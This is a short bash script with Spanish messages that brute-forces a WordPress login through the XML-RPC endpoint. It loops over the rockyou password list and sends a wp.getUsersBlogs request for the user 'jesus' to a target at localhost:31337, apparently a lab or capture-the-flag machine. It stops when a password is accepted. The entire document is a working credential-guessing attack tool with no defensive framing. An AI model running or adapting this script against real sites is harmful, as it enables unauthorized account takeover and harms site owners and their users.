#!/bin/bash

function ctrl_c(){
	echo -e "\n\n [+]Saliendo...\n\n"
	exit 1
}

trap ctrl_c SIGINT

function crearxml(){
	password=$1
	xmltype="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>jesus</value></param> 
<param><value>$password</value></param> 
</params> 
</methodCall>
"""

echo $xmltype > file.xml
echo "Probando con la contraseña $password"

response=$(curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@file.xml)

if [ ! "$(echo $response | grep "Incorrect username or password")"  ];then
	echo "The password is $password"
	exit 0
fi


}

cat /opt/rockyou.txt | while read password; do 
	crearxml $password
done
